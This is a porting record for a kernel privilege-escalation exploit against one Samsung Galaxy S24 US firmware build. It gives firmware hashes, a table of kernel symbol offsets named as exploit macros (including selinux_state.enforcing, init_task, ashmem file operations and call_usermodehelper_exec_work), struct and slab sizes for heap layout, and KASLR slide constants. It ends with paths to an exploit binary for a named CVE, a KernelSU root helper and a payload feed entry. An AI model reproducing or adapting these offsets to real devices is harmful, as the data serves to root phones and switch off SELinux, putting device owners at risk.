# SM-S921U / S921USQS6DZF2 porting record

This file records the evidence-driven port of the Galaxy S24 US (Qualcomm Snapdragon 8 Gen 3) firmware.

## Stage 1: Firmware identity & inputs

| Field | Verified value |
| --- | --- |
| Package model | `SM-S921U` |
| AP/PDA package | `S921USQS6DZF2` |
| Device codename | `e1q` |
| Product name | `e1qsqw` |
| Platform / SoC | `pineapple` (Qualcomm Snapdragon 8 Gen 3, SM8650) |
| Android build ID | `UP1A.231005.007` |
| Build fingerprint | `samsung/e1qsqw/e1q:14/UP1A.231005.007/S921USQS6DZF2:user/release-keys` |
| Kernel release | `6.1.145-android14-11-33419968-abS928USQS6DZF2` |
| Page size | 4096 (4 KiB) |

### Extracted image hashes

| Object | Size (bytes) | SHA-256 |
| --- | ---: | --- |
| Decompressed `boot.img` | 100,663,296 | `2d7041a156862981ca5af5529c8fca4e8309c8e9fa5f1557491002336d3d7e55` |
| Raw kernel payload | 38,005,248 | `7b1a1c85ee54bc0ce867642be83f2c1b16252552310976f6a09b353846c06144` |
| Recovered `vmlinux.elf` | 43,070,883 | `f99b81dca0b44c86e4aad58664497305d796c220ef4a895d2f6680138fc88b06` |
| Extracted `vmlinux.btf` | 5,981,643 | `8415104c012e18942b18bcb52f401075cb6b92df837b9552a8c11070d65efe56` |

## Stage 2: Symbol and BTF extraction

Image base: `0xffffffc008000000`

| Macro/use | Target symbol | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d39cc` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `worker_thread` (+schedule return) | `0x000db1a0` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a14e4` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003ef340` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x004712a4` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x004717d4` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d3a314` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d3ac4c` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d3aca4` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d3aed0` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d3af58` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d3b078` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01219d90` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013d1140` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` (logger->name) | `0x016a622a` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x0176c6f8` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0223ae60` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02242a20` |
| `INIT_TASK_OFF` | `init_task` | `0x0224f8c0` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_miscs + 0x10` | `0x023bb5b0` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[boot_id].data` | `0x023762f0` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x0244cd80` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x02521588` |
| `SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026046e8` |

## Stage 3: Target layouts & allocator

```text
sizeof(struct rt_mutex_waiter) = 0x58  (COMPACT_RT_MUTEX_WAITER)
sizeof(struct mm_struct)       = 0x3c0, SLUB stride 0x400  (MM_STRUCT_SZ 0x400)
sizeof(struct page)            = 0x40
enum kmalloc_cache_type { NORMAL=0, DMA=0, CGROUP=1, RECLAIM=2, NR=3 }
kmalloc_caches = [3][14] (42 qwords) -> KMALLOC_CGROUP_TYPE 1
```

## Stage 4: Physical load & slide configuration

Qualcomm ABL handoff loads the kernel Image at physical `0x80080000`:

```c
#define P0_PHYS_OFFSET      0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#define SKB_DATA_DELTA      (-0x1000LL)
#define SLIDE_PSELECT_WORD_SHIFT 3
#define APP_P0_FINGERPRINT_INVERSE_SLIDE 1
```

## Stage 5: Artifacts & support feed

* Exploit binary: `artifacts/e1q-S921USQS6DZF2/cve-2026-43499-app.so` (104,128 bytes)
* Late-load helper: `kernelsu/ksud-e1q-S921USQS6DZF2-kdp` (4,779,160 bytes)
* Feed registration: `support/targets-v3.json` (`payloadId: "e1q-S921USQS6DZF2"`)
